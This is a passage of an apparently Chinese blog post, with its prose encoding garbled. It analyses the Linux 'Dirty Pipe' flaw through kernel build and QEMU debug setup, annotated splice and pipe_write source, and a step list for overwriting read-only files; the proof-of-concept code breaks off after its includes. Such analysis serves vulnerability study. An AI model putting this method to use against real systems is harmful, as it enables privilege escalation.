class=\"line\">make  # ç¼–è¯‘æºç </span><br><span class=\"line\">make install  # å®‰è£…</span><br></pre></td></tr></table></figure>\n<p>è¿™å¾—è€åŠå¤©äº†</p>\n<h2 id=\"linux\"><a class=\"markdownIt-Anchor\" href=\"#linux\">#</a> Linux</h2>\n<p>é€‰ç”¨ v5.13-rc1 ç‰ˆæœ¬</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">wget https://github.com/torvalds/linux/archive/refs/tags/v5.13-rc1.tar.gz</span><br><span class=\"line\">make menuconfig </span><br><span class=\"line\">cat /proc/cpuinfo| grep &quot;cpu cores&quot; | uniq # check cpu core counts</span><br><span class=\"line\">make bzImage -j4</span><br></pre></td></tr></table></figure>\n<p>æ‰£ y é€‰ä¸­</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">kernel hacking -&gt;compile-time checks and compiler opt -&gt; compile the kernel with debug info</span><br><span class=\"line\">\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t-&gt; Provide GDB scripts for kernel debugging</span><br><span class=\"line\">\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t-&gt; Generate readable assembler code               </span><br><span class=\"line\">kernel hacking -&gt; compile the kernel with frame pointers (æ²¡æ‰¾åˆ°)</span><br><span class=\"line\">kernel hacking -&gt; Generic Kernel Debugging Instruments -&gt; KGDB: kernel debugger -&gt;</span><br><span class=\"line\">\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tKGDB: use kgdb over the serial console (NEW)</span><br><span class=\"line\">\t\t\t\t\t\t\t\t\t\t\t\t\t</span><br></pre></td></tr></table></figure>\n<p>ç„¶åè®°å¾—ä¿è¯ä»¥ä¸‹å‡ ä¸ªä¹Ÿæ‰“å¼€äº†</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">CONFIG_DEBUG_INFO_DWARF4=y</span><br></pre></td></tr></table></figure>\n<p>ç„¶åéšä¾¿æ‰¾ä¸ª ctf çš„æ–‡ä»¶ç³»ç»Ÿå°±è¡Œ æˆ–è€… busybox ç¼–è¯‘ã€‚</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cpio -idmv &lt; ../rootfs.img #è§£åŒ…cpio</span><br><span class=\"line\">find . | cpio -o --format=newc &gt; ../rootfs.img #æ‰“åŒ…cpio</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">qemu-system-x86_64 \\</span><br><span class=\"line\">\t-m 256M \\</span><br><span class=\"line\">\t-kernel ./arch/x86/boot/bzImage \\</span><br><span class=\"line\">\t-initrd ./rootfs.img \\</span><br><span class=\"line\">\t-append &quot;root=/dev/ram rw console=ttyS0 oops=panic panic=1 quiet nokaslr&quot; \\</span><br><span class=\"line\">\t-cpu qemu64 \\</span><br><span class=\"line\">\t-nographic \\</span><br><span class=\"line\">\t-net nic,model=virtio \\</span><br><span class=\"line\">\t-net user \\</span><br><span class=\"line\">\t-s \\</span><br><span class=\"line\">\t-S</span><br></pre></td></tr></table></figure>\n<h1 id=\"é™æ€åˆ†æ\"><a class=\"markdownIt-Anchor\" href=\"#é™æ€åˆ†æ\">#</a> é™æ€åˆ†æ</h1>\n<h4 id=\"spliceå‡½æ•°\"><a class=\"markdownIt-Anchor\" href=\"#spliceå‡½æ•°\">#</a> splice å‡½æ•°</h4>\n<p>åœ¨ä¸¤ä¸ª fd ä¸­ç§»åŠ¨æ•°æ® ä¸ºé›¶æ‹·è´æ“ä½œ<br>\næ¯”å¦‚è¦å®ç° fp1 åˆ° fp2 çš„æ•°æ®æ‹·è´ æ­£å¸¸æ¥è¯´æ˜¯è¦ç»å† <code>kernel space -&gt; user space -&gt; kernel space</code> <br>\n ç”¨ splice å°±å¯ä»¥å˜æˆ <code>fp1 -&gt; pipe_read -&gt; pipe_write -&gt; fp2</code></p>\n<p>å°† fd_in ä¼ é€’åˆ°æ–‡ä»¶æè¿°ç¬¦ fd_outï¼Œå…¶ä¸­æ–‡ä»¶æè¿°ç¬¦ä¹‹ä¸€å¿…é¡»å¼•ç”¨ç®¡é“ã€‚<br>\n <code>splice</code> Â çš„é›¶æ‹·è´æ–¹æ³•å°±æ˜¯ï¼Œç›´æ¥ç”¨æ–‡ä»¶ç¼“å­˜é¡µæ¥æ›¿æ¢ <code>pipe</code> Â ä¸­çš„ç¼“å­˜é¡µ (æ›´æ”¹ pipe ç¼“å­˜é¡µæŒ‡é’ˆæŒ‡å‘æ–‡ä»¶ç¼“å­˜é¡µ)ã€‚<br>\nä¹Ÿå°±æ˜¯å®é™…ä¸Šä¸éœ€è¦ç»è¿‡æŠŠæˆ‘ä»¬çš„è¾“å…¥æ‹·è´åˆ° pipe è¿™ä¸€æ­¥ï¼Œç›´æ¥æŠŠæˆ‘ä»¬æ•°æ®çš„ç¼“å­˜é¡µçš„ä½ç½®ç»™åˆ°éœ€è¦ç”¨åˆ°è¿™ä¸ªçš„ fd å°±è¡Œäº†ã€‚ï¼ˆå› ä¸º pipe å°±æ˜¯ä¸€ç«¯å†™å…¥ä¸€ç«¯è¯»å…¥ï¼Œæˆ‘å¦‚æœæŠŠæ–‡ä»¶å†…å®¹å†™å…¥ç®¡é“ç¼“å†²åŒºï¼Œç„¶åå†ä»ç®¡é“ç¼“å†²åŒºå†™å‡ºï¼Œä¸å¦‚åœ¨ç®¡é“ç¼“å†²åŒºçš„æ—¶å€™ç›´æ¥è®© buffer çš„ page æŒ‡å‘åŸæ¥é‚£ä¸ªé¡µçš„å†…å­˜ç¼“å­˜é¡µï¼Œè¿™æ ·å°±å°‘äº† copy é‚£ä¸€æ­¥ï¼‰</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">ssize_t</span> <span class=\"title function_\">splice</span><span class=\"params\">(<span class=\"type\">int</span> fd_in, <span class=\"type\">loff_t</span> *off_in, <span class=\"type\">int</span> fd_out,</span></span><br><span class=\"line\"><span class=\"params\">               <span class=\"type\">loff_t</span> *off_out, <span class=\"type\">size_t</span> len, <span class=\"type\">unsigned</span> <span class=\"type\">int</span> flags)</span>;</span><br></pre></td></tr></table></figure>\n<ul>\n<li>If fd_in refers to a pipe, then off_in must be NULL</li>\n<li>If fd_in does not refer to a pipe and off_in is NULL, then bytes are read from fd_in starting from the file offset, and the file offset is adjusted appropriately.</li>\n</ul>\n<p>splice æœ€ç»ˆä¼šè°ƒç”¨ <code>copy_page_to_iter_pipe</code>  å‡½æ•°<br>\nè€Œè¿™ä¸ªå‡½æ•°å¹¶æ²¡æœ‰æ¸…é™¤ <code>PIPE_BUF_FLAG_CAN_MERGE</code>  ä½<br>\n iov_iter æºå¸¦äº†æˆ‘ä»¬å†™å…¥çš„é‚£ä¸ªç®¡é“ è€Œè¿™ä¸ªç®¡é“çš„å¤´éƒ¨ buf è¢«æŒ‡å‘äº†æˆ‘ä»¬é€å…¥çš„ç¬¬ä¸€ä¸ªå‚æ•° pageï¼Œè¿™ä¸ª page æ˜¯å†…å­˜ç¼“å­˜é¡µçš„å†…å®¹ã€‚</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">static</span> <span class=\"type\">size_t</span> <span class=\"title function_\">copy_page_to_iter_pipe</span><span class=\"params\">(<span class=\"keyword\">struct</span> page *page, <span class=\"type\">size_t</span> offset, <span class=\"type\">size_t</span> bytes,</span></span><br><span class=\"line\"><span class=\"params\">\t\t\t <span class=\"keyword\">struct</span> iov_iter *i)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">pipe_inode_info</span> *<span class=\"title\">pipe</span> =</span> i-&gt;pipe;</span><br><span class=\"line\">\t<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">pipe_buffer</span> *<span class=\"title\">buf</span>;</span></span><br><span class=\"line\">\t<span class=\"type\">unsigned</span> <span class=\"type\">int</span> p_tail = pipe-&gt;tail;</span><br><span class=\"line\">\t<span class=\"type\">unsigned</span> <span class=\"type\">int</span> p_mask = pipe-&gt;ring_size - <span class=\"number\">1</span>;</span><br><span class=\"line\">\t<span class=\"type\">unsigned</span> <span class=\"type\">int</span> i_head = i-&gt;head;</span><br><span class=\"line\">\t<span class=\"type\">size_t</span> off;</span><br><span class=\"line\"></span><br><span class=\"line\">\t(Â·Â·Â·)</span><br><span class=\"line\"></span><br><span class=\"line\">\tbuf = &amp;pipe-&gt;bufs[i_head &amp; p_mask];</span><br><span class=\"line\">\t</span><br><span class=\"line\">\t(Â·Â·Â·)</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">/* é‡ç‚¹ bufçš„opsæŒ‡å‘äº†æ–‡ä»¶ç¼“å­˜é¡µ */</span></span><br><span class=\"line\">\tbuf-&gt;ops = &amp;page_cache_pipe_buf_ops;</span><br><span class=\"line\">\tget_page(page);</span><br><span class=\"line\">\tbuf-&gt;page = page;<span class=\"comment\">/* ç›´æ¥æŒ‡å‘äº†æ–‡ä»¶ç¼“å­˜é¡µ */</span></span><br><span class=\"line\">\tbuf-&gt;offset = offset;</span><br><span class=\"line\">\tbuf-&gt;len = bytes;</span><br><span class=\"line\"></span><br><span class=\"line\">\tpipe-&gt;head = i_head + <span class=\"number\">1</span>;</span><br><span class=\"line\">\ti-&gt;iov_offset = offset + bytes;</span><br><span class=\"line\">\ti-&gt;head = i_head;</span><br><span class=\"line\">out:</span><br><span class=\"line\">\ti-&gt;count -= bytes;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> bytes;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h4 id=\"pipe_writeåˆ†æ\"><a class=\"markdownIt-Anchor\" href=\"#pipe_writeåˆ†æ\">#</a> pipe_write åˆ†æ</h4>\n<p>åˆ©ç”¨çš„ç‚¹æ˜¯ pipe è¢«åˆå§‹åŒ–ç”³è¯·ä¼šé»˜è®¤è®¾ç½® flag ä¸º <code>PIPE_BUF_FLAG_CAN_MERGE</code></p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">static</span> <span class=\"type\">ssize_t</span></span><br><span class=\"line\"><span class=\"title function_\">pipe_write</span><span class=\"params\">(<span class=\"keyword\">struct</span> kiocb *iocb, <span class=\"keyword\">struct</span> iov_iter *from)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">file</span> *<span class=\"title\">filp</span> =</span> iocb-&gt;ki_filp;</span><br><span class=\"line\">\t<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">pipe_inode_info</span> *<span class=\"title\">pipe</span> =</span> filp-&gt;private_data;</span><br><span class=\"line\">\t<span class=\"type\">unsigned</span> <span class=\"type\">int</span> head;</span><br><span class=\"line\">\t<span class=\"type\">ssize_t</span> ret = <span class=\"number\">0</span>;</span><br><span class=\"line\">\t<span class=\"type\">size_t</span> total_len = iov_iter_count(from);</span><br><span class=\"line\">\t<span class=\"type\">ssize_t</span> chars;</span><br><span class=\"line\">\t<span class=\"type\">bool</span> was_empty = <span class=\"literal\">false</span>;</span><br><span class=\"line\">\t<span class=\"type\">bool</span> wake_next_writer = <span class=\"literal\">false</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">\t(Â·Â·Â·)</span><br><span class=\"line\"></span><br><span class=\"line\">\thead = pipe-&gt;head; <span class=\"comment\">// è·å–å¤´ç»“ç‚¹ headæ˜¯intç±»å‹ </span></span><br><span class=\"line\">\t<span class=\"comment\">// pipeæ˜¯å¾ªç¯é“¾è¡¨ç»“æ„ å¦‚æœhead == tail ä»£è¡¨ç©ºäº†</span></span><br><span class=\"line\">\twas_empty = pipe_empty(head, pipe-&gt;tail);</span><br><span class=\"line\">\t<span class=\"comment\">// charså°±æ˜¯æ•°æ®é•¿åº¦</span></span><br><span class=\"line\">\tchars = total_len &amp; (PAGE_SIZE<span class=\"number\">-1</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">/* å¦‚æœæœ‰é•¿åº¦ä¸”ç®¡é“ä¸ä¸ºç©º */</span></span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (chars &amp;&amp; !was_empty) &#123;</span><br><span class=\"line\">\t\t<span class=\"type\">unsigned</span> <span class=\"type\">int</span> mask = pipe-&gt;ring_size - <span class=\"number\">1</span>;</span><br><span class=\"line\">\t\t<span class=\"comment\">// bufæŒ‡å‘ç®¡é“çš„ç¼“å†²åŒº</span></span><br><span class=\"line\">\t\t<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">pipe_buffer</span> *<span class=\"title\">buf</span> =</span> &amp;pipe-&gt;bufs[(head - <span class=\"number\">1</span>) &amp; mask];</span><br><span class=\"line\">\t\t<span class=\"type\">int</span> offset = buf-&gt;offset + buf-&gt;len;</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t<span class=\"comment\">/* â˜† æ­¤å¤„é‡ç‚¹ â˜†</span></span><br><span class=\"line\"><span class=\"comment\">\t\t\tå¦‚æœflagsæ ‡å¿—ä½ä¸º PIPE_BUF_FLAG_CAN_MERGE</span></span><br><span class=\"line\"><span class=\"comment\">\t\t\tå¹¶ä¸”å½“å‰bufå·²ç»å†™è¿‡çš„offsetåŠ ä¸Šå³å°†å†™çš„charsçš„å¤§å°å°äºPSIZE</span></span><br><span class=\"line\"><span class=\"comment\">\t\t\tå°±ä¼šç»§ç»­å†™</span></span><br><span class=\"line\"><span class=\"comment\">\t\t */</span></span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> ((buf-&gt;flags &amp; PIPE_BUF_FLAG_CAN_MERGE) &amp;&amp;</span><br><span class=\"line\">\t\t    offset + chars &lt;= PAGE_SIZE) &#123;</span><br><span class=\"line\">\t\t   <span class=\"comment\">// éªŒè¯æ•°æ®å­˜åœ¨ å’ŒIOé˜»å¡ç›¸å…³ è¿”å›0ä»£è¡¨æ­£å¸¸</span></span><br><span class=\"line\">\t\t\tret = pipe_buf_confirm(pipe, buf);</span><br><span class=\"line\">\t\t\t(Â·Â·Â·)</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t\t<span class=\"comment\">// æ­¤å‡½æ•°å°±æ˜¯å¾€ç®¡é“çš„bufæ‰€åœ¨çš„é¡µå†™æ•°æ®äº† å¦‚æœå†™äº†ä¹‹åä¼šç›´æ¥go out ä¸ä¼šèµ°ä¸‹é¢çš„for(;;)</span></span><br><span class=\"line\">\t\t\tret = copy_page_from_iter(buf-&gt;page, offset, chars, from);</span><br><span class=\"line\">\t\t\t(Â·Â·Â·)</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t\tbuf-&gt;len += ret;</span><br><span class=\"line\">\t\t\t(Â·Â·Â·)</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">// ä¸Šä¸€é¡µä¸èƒ½æ¥ç€å†™çš„æƒ…å†µ å°±æ˜¯æœ¬åº”è¯¥èµ°çš„æ­£å¸¸æƒ…å†µ</span></span><br><span class=\"line\">\t<span class=\"keyword\">for</span> (;;) &#123;</span><br><span class=\"line\">\t\t(Â·Â·Â·)</span><br><span class=\"line\"></span><br><span class=\"line\">\t\thead = pipe-&gt;head;</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> (!pipe_full(head, pipe-&gt;tail, pipe-&gt;max_usage)) &#123;</span><br><span class=\"line\">\t\t\t<span class=\"type\">unsigned</span> <span class=\"type\">int</span> mask = pipe-&gt;ring_size - <span class=\"number\">1</span>;</span><br><span class=\"line\">\t\t\t<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">pipe_buffer</span> *<span class=\"title\">buf</span> =</span> &amp;pipe-&gt;bufs[head &amp; mask];</span><br><span class=\"line\">\t\t\t<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">page</span> *<span class=\"title\">page</span> =</span> pipe-&gt;tmp_page;</span><br><span class=\"line\">\t\t\t<span class=\"type\">int</span> copied;</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t\t<span class=\"comment\">// é‡æ–°ç”³è¯·ä¸€ä¸ªpage</span></span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span> (!page) &#123;</span><br><span class=\"line\">\t\t\t\tpage = alloc_page(GFP_HIGHUSER | __GFP_ACCOUNT);</span><br><span class=\"line\">\t\t\t\t</span><br><span class=\"line\">\t\t\t\t(Â·Â·Â·)</span><br><span class=\"line\">\t\t\t\t</span><br><span class=\"line\">\t\t\t\tpipe-&gt;tmp_page = page;</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t\tspin_lock_irq(&amp;pipe-&gt;rd_wait.lock);</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t\thead = pipe-&gt;head;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span> (pipe_full(head, pipe-&gt;tail, pipe-&gt;max_usage)) &#123;</span><br><span class=\"line\">\t\t\t\tspin_unlock_irq(&amp;pipe-&gt;rd_wait.lock);</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">continue</span>;</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t\tpipe-&gt;head = head + <span class=\"number\">1</span>;</span><br><span class=\"line\">\t\t\tspin_unlock_irq(&amp;pipe-&gt;rd_wait.lock);</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t\t<span class=\"comment\">/* Insert it into the buffer array */</span></span><br><span class=\"line\">\t\t\t<span class=\"comment\">/* é‡ç‚¹ åˆå§‹åŒ–é˜¶æ®µ */</span></span><br><span class=\"line\">\t\t\tbuf = &amp;pipe-&gt;bufs[head &amp; mask];</span><br><span class=\"line\">\t\t\tbuf-&gt;page = page;</span><br><span class=\"line\">\t\t\tbuf-&gt;ops = &amp;anon_pipe_buf_ops;</span><br><span class=\"line\">\t\t\tbuf-&gt;offset = <span class=\"number\">0</span>;</span><br><span class=\"line\">\t\t\tbuf-&gt;len = <span class=\"number\">0</span>;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span> (is_packetized(filp))</span><br><span class=\"line\">\t\t\t\tbuf-&gt;flags = PIPE_BUF_FLAG_PACKET;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">else</span><span class=\"comment\">// â˜† é»˜è®¤è®¾ç½®flagä¸º PIPE_BUF_FLAG_CAN_MERGE</span></span><br><span class=\"line\">\t\t\t\tbuf-&gt;flags = PIPE_BUF_FLAG_CAN_MERGE;</span><br><span class=\"line\">\t\t\tpipe-&gt;tmp_page = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t\tcopied = copy_page_from_iter(page, <span class=\"number\">0</span>, PAGE_SIZE, from);</span><br><span class=\"line\">\t\t\t(Â·Â·Â·)</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"pocåˆ†æ\"><a class=\"markdownIt-Anchor\" href=\"#pocåˆ†æ\">#</a> POC åˆ†æ</h3>\n<ul>\n<li>ä½œè€…é¦–å…ˆå¡«æ»¡äº† 16 ä¸ª PIPEï¼Œå°† flag éƒ½é»˜è®¤è®¾ç½®ä¸º <code>PIPE_BUF_FLAG_CAN_MERGE</code></li>\n<li>ç„¶åè¯»å– æ¸…ç©º pipe</li>\n<li>ç”¨ open æ‰“å¼€å¯¹åº”æ–‡ä»¶ï¼Œåªè¯»å³å¯ è¿™æ ·å°±å°†æ–‡ä»¶æ”¾åˆ°ç¼“å­˜é¡µé‡Œäº†</li>\n<li>splice ç³»ç»Ÿè°ƒç”¨å°†å¯¹åº”çš„ç®¡é“çš„ buf å’Œæ–‡ä»¶ç¼“å­˜é¡µç»‘å®šåœ¨ä¸€èµ·</li>\n<li>åˆ©ç”¨ splice ä¸åˆå§‹åŒ– <code>PIPE_BUF_FLAG_CAN_MERGE</code>  çš„ç‰¹æ€§ ç»§ç»­å¾€ç®¡é“é‡Œå†™å…¥ å°±å†™å…¥åˆ°äº†å¯¹åº”çš„æ–‡ä»¶ç¼“å­˜åŒºäº†<br>\nè¿™å°±é€ æˆäº†ä¸€ä¸ªä»»æ„æ–‡ä»¶å†™çš„æ¼æ´</li>\n</ul>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> _GNU_SOURCE</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;unistd.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;fcntl.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdlib.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;string.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;sys/stat.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;sys/user.h&gt;</span></span></span><br><span 